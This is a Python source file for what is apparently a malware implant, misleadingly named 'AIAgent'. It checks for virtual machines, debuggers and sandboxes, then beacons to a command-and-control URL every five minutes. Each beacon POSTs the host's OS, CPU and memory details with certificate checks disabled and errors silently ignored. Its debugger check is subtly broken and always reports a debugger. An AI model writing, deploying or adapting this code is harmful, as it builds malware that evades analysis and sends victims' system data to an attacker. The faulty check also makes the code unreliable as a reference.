import time, psutil, platform, hashlib, json, requests, threading

class ThreatIntel:
    VM = 1
    DEBUG = 2
    AV = 4
    SANDBOX = 8

class AIAgent:
    def __init__(self, c2_url, client_id):
        self.c2 = c2_url
        self.id = client_id
        self.threat_level = 0
        self.behavior = []
        self.last_activity = time.time()

    def analyze(self):
        if self.is_vm(): self.threat_level |= ThreatIntel.VM
        if self.is_debugger(): self.threat_level |= ThreatIntel.DEBUG
        if self.is_sandbox(): self.threat_level |= ThreatIntel.SANDBOX

    def is_vm(self):
        indicators = ["vbox", "vmware", "qemu", "hyperv", "docker"]
        info = platform.platform().lower()
        return any(i in info for i in indicators)

    def is_debugger(self):
        try:
            return open("/proc/self/status").read().find("TracerPid:") > 0
        except:
            return False

    def is_sandbox(self):
        return psutil.virtual_memory().total < 2*1024**3

    def report(self):
        report = {
            "client_id": self.id,
            "timestamp": time.time(),
            "threat_level": self.threat_level,
            "os": platform.platform(),
            "cpu": psutil.cpu_percent(),
            "mem": psutil.virtual_memory().percent,
            "behavior": self.behavior
        }
        try:
            requests.post(f"{self.c2}/api/ai_report", json=report, verify=False)
        except:
            pass

    def start(self):
        self.analyze()
        while True:
            self.report()
            time.sleep(300)

def run_agent(c2_url, client_id):
    agent = AIAgent(c2_url, client_id)
    agent.start()